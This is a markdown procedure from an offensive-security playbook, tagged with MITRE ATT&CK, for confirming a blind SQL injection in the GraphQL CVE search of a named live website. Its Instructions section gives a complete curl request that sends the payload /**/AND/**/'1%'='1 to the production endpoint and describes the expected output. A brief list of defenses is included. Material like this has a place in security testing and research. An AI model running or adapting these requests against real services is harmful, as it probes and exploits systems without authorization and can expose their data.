---
id: proc-uuid-002
tags:
  - sqli
  - blind-sqli
  - true-payload
type: procedure
tools:
  - '[[tools/Chrome]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-graphql-cve-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.998Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SQL-Injection-with-True-Payload

## Summary

This procedure tests SQL injection by appending a true-evaluating payload to a valid search term, confirming injection when results are returned as expected.

## Description

In the CVE Discovery Search, terms are split and interpolated into SQL without escaping, allowing payloads like /**/AND/**/'1%'='1 to modify the query clause. This blind technique verifies the injection point in the GraphQL resolver, potentially enabling data disclosure from the Analytics Database cache.

## Requirements

1. Access to the search page
2. Knowledge of a valid search term (e.g., CVE ID)
3. Browser or curl for querying

## Defense

Defensive measures and detection strategies:

- Parameterize SQL queries in the resolver
- Input validation to block SQL keywords and comments
- Log and alert on search queries with suspicious patterns like AND or %

## Objectives

1. Inject true condition to bypass or alter query
2. Confirm injection by observing result presence
3. Validate control over SQL execution

## Instructions

### Step 1: Enter Payload in Search

**Context**: Combine valid term with true payload to test if query executes without error and returns results.

Use browser or execute [[commands/curl-graphql-cve-query]] with search parameter set to "validterm /**/AND/**/'1%'='1":

```bash
curl 'https://hackerone.com/graphql' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: keep-alive' --data-raw '{"operationName":"CveDataQuery","variables":{"first":25,"offset":0,"search":"validterm /**/AND/**/\'1%\'=\'1"},"query":"query CveDataQuery($first: Int, $after: String, $last: Int, $before: String, $search: String, $offset: Int) {\n ranked_cve_entries(\n first: $first\n after: $after\n last: $last\n before: $before\n search: $search\n offset: $offset\n ) {\n total_count\n pageInfo {\n hasNextPage\n endCursor\n hasPreviousPage\n startCursor\n __typename\n }\n edges {\n node {\n id\n cve_id\n cve_description\n rank\n reports_submitted_count\n __typename\n }\n __typename\n }\n __typename\n }\n}\n"}' --compressed
```

> This sends the GraphQL query. Expected output: JSON with total_count > 0 and edges containing CVE nodes, indicating successful true injection.

### Step 2: Verify Results

**Context**: Check if results match a normal search, confirming injection.

Inspect the response for CVE entries.

> Success if results appear; failure if errors or no results.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-cve-query]]

## Tools Used

- [[tools/Chrome]]

## Tags

- sqli
- blind-sqli
- true-payload
